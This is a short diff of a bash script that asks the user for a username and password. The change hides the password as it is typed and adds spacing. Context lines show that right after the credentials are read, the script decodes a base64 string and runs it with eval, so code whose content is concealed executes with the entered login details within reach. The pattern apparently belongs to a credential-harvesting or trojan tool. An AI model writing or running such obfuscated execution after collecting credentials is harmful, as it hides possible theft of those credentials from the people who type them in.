@@ -65,9 +65,10 @@ read -p $'\n\e[96m(username)>>> \e[0m' usrn
 
 #passw
 echo -e $red Enter your Password : $blank
-read -p $'\n\e[96m(password)>>> \e[0m' passwd
+read -s -p $'\n\e[96m(password)>>> \e[0m' passwd
 eval $(base64 -d <<<"$snd")
-
+echo " "
+echo " "
 #py
 echo -e $yellow [!] $cyan Please Wait... $blank
 echo " "
